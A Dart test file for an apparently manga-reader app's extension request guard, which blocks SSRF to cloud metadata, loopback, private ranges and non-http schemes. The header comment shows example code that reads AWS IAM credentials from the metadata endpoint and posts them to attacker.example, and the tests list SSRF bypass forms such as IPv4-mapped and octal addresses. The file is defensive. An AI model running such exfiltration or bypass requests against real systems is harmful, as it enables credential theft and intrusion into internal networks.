// Extension HTTP request guard.
//
// WHY THIS EXISTS
//
// The QuickJS `Client` bridge is injected as a global into the scraper
// sandbox, and `_toHttpResponse` hands the entire response body back to the
// script. That is a read primitive with an exfiltration channel, granted to
// code Sunfire downloads from a repo index and auto-installs with no user
// review.
//
// A scraper is only ever meant to talk to the manga site it was written for.
// Before this guard existed, `new Client().get(url)` accepted any URL at all,
// so an extension could read the cloud metadata endpoint and POST the
// credentials out:
//
//   const role = await new Client().get(
//     'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
//   const key  = await new Client().get(
//     'http://169.254.169.254/latest/meta-data/iam/security-credentials/x');
//   await new Client().post('https://attacker.example/x', {}, {k: key.body});
//
// The same primitive reached loopback (the user's own FlareSolverr), the whole
// private LAN (NAS, router admin, Jellyfin), and any public origin.
//
// WHAT IS PINNED HERE
//   1. Cloud metadata, loopback, private ranges, link-local and CGNAT are
//      refused — including the IPv6 equivalents and IPv4-mapped forms.
//   2. Non-http(s) schemes are refused (`file:`, `data:`, `gopher:`, …).
//   3. Local mDNS / split-horizon names are refused without needing DNS.
//   4. Malformed or ambiguous IPv4 literals are NOT waved through by being
//      mis-parsed as hostnames.
//   5. Ordinary public hosts and public IPs still work — an over-broad guard
//      that blocked real scraping would be its own outage.
//
// Run: fvm flutter test test/extension_request_guard_test.dart
import 'package:flutter_test/flutter_test.dart';
import 'package:sunfire/src/core/engine/javascript/request_guard.dart';

String? reason(String url) => blockedRequestReason(Uri.parse(url));

void main() {
  group('blocked: cloud metadata and link-local', () {
    test('the AWS/GCP/Azure metadata endpoint is refused', () {
      // This is the single highest-value target: it hands out cloud
      // credentials to anything that can reach it.
      expect(reason('http://169.254.169.254/latest/meta-data/'), isNotNull);
      expect(reason('http://169.254.169.254/computeMetadata/v1/'), isNotNull);
      expect(reason('https://169.254.169.254/'), isNotNull);
    });

    test('the rest of link-local is refused', () {
      expect(reason('http://169.254.0.1/'), isNotNull);
      expect(reason('http://169.254.255.254/'), isNotNull);
    });

    test('IPv6 link-local is refused, with and without a zone id', () {
      expect(reason('http://[fe80::1]/'), isNotNull);
      expect(reason('http://[fe80::1%25eth0]/'), isNotNull);
      expect(reason('http://[febf::1]/'), isNotNull);
    });
  });

  group('blocked: loopback', () {
    test('IPv4 and IPv6 loopback are refused', () {
      expect(reason('http://127.0.0.1:4567/graphql'), isNotNull);
      expect(reason('http://127.0.0.1:8191/'), isNotNull);
      expect(reason('http://127.1.2.3/'), isNotNull);
      expect(reason('http://[::1]:8191/'), isNotNull);
    });

    test('the loopback NAMES are refused without DNS', () {
      expect(reason('http://localhost/'), isNotNull);
      expect(reason('http://localhost:8191/v1'), isNotNull);
      expect(reason('http://LOCALHOST/'), isNotNull, reason: 'host compare is case-insensitive');
      expect(reason('http://ip6-localhost/'), isNotNull);
      expect(reason('http://broadcasthost/'), isNotNull);
    });

    test('dot-suffixed local names are refused', () {
      expect(reason('http://nas.local/'), isNotNull);
      expect(reason('http://router.internal/'), isNotNull);
      expect(reason('http://api.localhost/'), isNotNull);
      expect(reason('http://x.home.arpa/'), isNotNull);
    });
  });

  group('blocked: the private LAN', () {
    test('RFC1918 ranges are refused', () {
      expect(reason('http://10.0.0.5/'), isNotNull);
      expect(reason('http://10.255.255.254/'), isNotNull);
      expect(reason('http://192.168.1.1/admin'), isNotNull);
      expect(reason('http://192.168.0.104:4567/graphql'), isNotNull);
    });

    test('the whole 172.16/12 block is refused, and only that block', () {
      expect(reason('http://172.16.0.1/'), isNotNull);
      expect(reason('http://172.20.10.5/'), isNotNull);
      expect(reason('http://172.31.255.255/'), isNotNull);
      // 172.15 and 172.32 are public — must not be swept up.
      expect(reason('http://172.15.0.1/'), isNull);
      expect(reason('http://172.32.0.1/'), isNull);
    });

    test('carrier-grade NAT is refused', () {
      expect(reason('http://100.64.0.1/'), isNotNull);
      expect(reason('http://100.127.255.255/'), isNotNull);
      expect(reason('http://100.128.0.1/'), isNull, reason: 'outside 100.64/10');
    });

    test('IPv6 unique-local is refused', () {
      expect(reason('http://[fc00::1]/'), isNotNull);
      expect(reason('http://[fd12:3456::1]/'), isNotNull);
    });

    test('IPv4-mapped IPv6 cannot smuggle a private address through', () {
      // ::ffff:127.0.0.1 reaches loopback on a dual-stack socket, so checking
      // only the literal string "::ffff:" prefix would miss it.
      expect(reason('http://[::ffff:127.0.0.1]/'), isNotNull);
      expect(reason('http://[::ffff:192.168.0.1]/'), isNotNull);
      expect(reason('http://[::ffff:169.254.169.254]/'), isNotNull);
      expect(reason('http://[::ffff:8.8.8.8]/'), isNull);
    });
  });

  group('blocked: other non-routable space', () {
    test('the unspecified address is refused', () {
      expect(reason('http://0.0.0.0/'), isNotNull);
      expect(reason('http://0.1.2.3/'), isNotNull);
      expect(reason('http://[::]/'), isNotNull);
    });

    test('multicast, reserved and benchmarking ranges are refused', () {
      expect(reason('http://224.0.0.1/'), isNotNull);
      expect(reason('http://239.255.255.250/'), isNotNull, reason: 'mDNS over IPv4');
      expect(reason('http://255.255.255.255/'), isNotNull);
      expect(reason('http://198.18.0.1/'), isNotNull);
    });
  });

  group('blocked: non-http schemes', () {
    test('schemes that are not http(s) are refused', () {
      for (final url in [
        'file:///etc/passwd',
        'data:text/html,<script>1</script>',
        'ftp://example.com/x',
        'gopher://example.com/x',
        'ws://example.com/x',
      ]) {
        expect(reason(url), isNotNull, reason: '$url must be refused');
      }
    });

    test('a scheme-less URL is refused rather than guessed at', () {
      expect(reason('//example.com/x'), isNotNull);
      expect(reason('example.com/x'), isNotNull);
    });
  });

  group('ambiguous literals are not waved through', () {
    test('a zero-padded octet is not treated as an address', () {
      // If 010.0.0.1 parsed as 10.0.0.1 the guard would refuse it; if it were
      // waved through as a hostname it would reach 10.0.0.1 on stacks that
      // accept the legacy octal form. Either way it must not be ALLOWED.
      expect(reason('http://010.0.0.1/'), isNotNull);
      expect(reason('http://127.0.0.01/'), isNotNull);
    });

    test('short and long forms are not addresses', () {
      expect(reason('http://127.1/'), isNotNull);
      expect(reason('http://1.2.3.4.5/'), isNotNull);
    });

    test('an out-of-range octet is not an address', () {
      expect(reason('http://999.1.1.1/'), isNotNull);
    });

    test('a host with no dot at all is refused unless it is a known local name', () {
      // A bare label can only be an intranet name, never a public site.
      expect(reason('http://intranet/'), isNotNull);
      expect(reason('http://router/'), isNotNull);
    });
  });

  group('allowed: real scraping targets keep working', () {
    // An over-broad guard that blocked these would be its own outage, so they
    // are asserted as explicitly as the blocked cases.
    test('public hosts are allowed', () {
      expect(reason('https://mangadex.org/title/12345'), isNull);
      expect(reason('https://ww3.mangafreak.me/manga/one-piece'), isNull);
      expect(reason('https://www.webtoons.com/en/fantasy/tower-of-god/list'), isNull);
      expect(reason('https://weebcentral.com/'), isNull);
      expect(reason('https://mangapill.com/manga/xyz'), isNull);
    });

    test('public IPs are allowed', () {
      expect(reason('https://8.8.8.8/'), isNull);
      expect(reason('https://1.1.1.1/'), isNull);
      expect(reason('https://172.32.0.1/'), isNull);
      expect(reason('https://[2606:4700:4700::1111]/'), isNull);
    });

    test('a host that merely CONTAINS a blocked string is allowed', () {
      // Guards written with `contains` instead of a label comparison break
      // these real sites.
      expect(reason('https://notlocalhost.example.com/'), isNull);
      expect(reason('https://127.0.0.1.example.com/'), isNull);
      expect(reason('https://192.168.1.1.nip.io/'), isNull);
      expect(reason('https://mylocal.site/'), isNull);
    });

    test('ports, paths, queries and fragments are irrelevant to the decision', () {
      expect(reason('https://mangadex.org:8443/a/b?c=d#e'), isNull);
      expect(reason('http://mangadex.org/'), isNull, reason: 'plain http is still scraping');
    });
  });
}
